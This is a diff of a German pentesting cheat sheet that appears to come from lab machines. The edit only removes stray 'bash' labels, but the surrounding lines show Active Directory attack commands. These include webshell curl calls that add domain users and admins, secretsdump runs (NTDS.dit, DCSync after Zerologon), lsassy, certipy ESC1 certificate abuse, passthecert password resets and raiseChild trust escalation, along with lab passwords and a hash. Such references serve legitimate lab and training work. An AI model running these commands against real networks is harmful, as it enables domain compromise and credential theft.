@@ -140,7 +140,6 @@ download SYSTEM
 
 **Datei-Upload (SMB):**
 
-bash
 
 ```bash
 # Via smbclient
@@ -171,7 +170,6 @@ type C:\Users\kioskUser0\Desktop\user_07eb46.txt
 
 **Datei-Extraktion:**
 
-bash
 
 ```bash
 tar -tvf backup.tar.gz
@@ -230,7 +228,6 @@ sc start WiseBootAssistant
 
 **Domain User erstellen:**
 
-bash
 
 ```bash
 # Via Webshell
@@ -239,7 +236,6 @@ curl "http://<TARGET_IP>/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add
 
 **Zu lokalen Admins hinzufügen:**
 
-bash
 
 ```bash
 curl "http://<TARGET_IP>/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
@@ -255,7 +251,6 @@ net group "Domain Admins" harry /add /domain
 
 **Passwort ändern (Computer Account):**
 
-bash
 
 ```bash
 changepasswd.py retro.vl/banking$:banking@<TARGET_IP> -altuser trainee -altpass trainee -newpass password1@
@@ -263,7 +258,6 @@ changepasswd.py retro.vl/banking$:banking@<TARGET_IP> -altuser trainee -altpass 
 
 **Passwort zurücksetzen (via SMB):**
 
-bash
 
 ```bash
 /usr/bin/smbpasswd -r <TARGET_IP> -U Caroline.Robinson
@@ -283,7 +277,6 @@ Get-ADTrust -Filter *
 
 **ldeep:**
 
-bash
 
 ```bash
 ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://<TARGET_IP> trusts
@@ -316,7 +309,6 @@ robocopy z:\windows\system32\config C:\Temp system /B
 
 **Secretsdump (NTDS.dit):**
 
-bash
 
 ```bash
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
@@ -324,7 +316,6 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 
 **Secretsdump (DCSync nach Zerologon):**
 
-bash
 
 ```bash
 secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
@@ -332,7 +323,6 @@ secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
 
 **Secretsdump (mit Credentials):**
 
-bash
 
 ```bash
 secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@<TARGET_IP>
@@ -340,7 +330,6 @@ secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrato
 
 **lsassy:**
 
-bash
 
 ```bash
 lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl <TARGET_IP>
@@ -350,7 +339,6 @@ lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl <TARGET_IP>
 
 **Certificate Templates finden:**
 
-bash
 
 ```bash
 certipy-ad find -u 'banking$@retro.vl' -p 'password1@' -dc-ip <TARGET_IP>
@@ -359,7 +347,6 @@ certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip <TARGET_IP>
 
 **Certificate Request (ESC1):**
 
-bash
 
 ```bash
 certipy-ad req -u 'banking$@retro.vl' -p 'password1@' -ca 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -dns 'dc.retro.vl' -key-size 4096 -dc-ip <TARGET_IP>
@@ -369,7 +356,6 @@ certipy-ad req -u 'MAIL01$' -hashes :<NTLM_HASH> -ca hybrid-DC01-CA -target <TAR
 
 **Certificate Authentication:**
 
-bash
 
 ```bash
 certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
@@ -379,7 +365,6 @@ certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
 
 **Password Reset via Certificate:**
 
-bash
 
 ```bash
 python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip <TARGET_IP> -target administrator -new-pass Password123!
@@ -389,7 +374,6 @@ python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain
 
 **Data Collection:**
 
-bash
 
 ```bash
 bloodhound-python -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -d hybrid.vl -dc dc01.hybrid.vl -ns <TARGET_IP> -c all
@@ -399,7 +383,6 @@ bloodhound-python -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -d hybrid.vl -dc dc01.hy
 
 **raiseChild.py:**
 
-bash
 
 ```bash
 raiseChild.py lab.trusted.vl/cpowers -hashes :<NTLM_HASH>
@@ -409,7 +392,6 @@ raiseChild.py lab.trusted.vl/cpowers -hashes :<NTLM_HASH>
 
 **keytabextract.py:**
 
-bash
 
 ````bash
 python3 keytabextract.py krb5.keytab
@@ -593,7 +575,6 @@ Get-ChildItem -Path <PATH> -Include <PATTERN> -File -Recurse -ErrorAction Silent
 
 ### Certipy Syntax
 
-bash
 
 ````bash
 certipy-ad find -u <USER> -p <PASS> -dc-ip <IP> [-vulnerable]
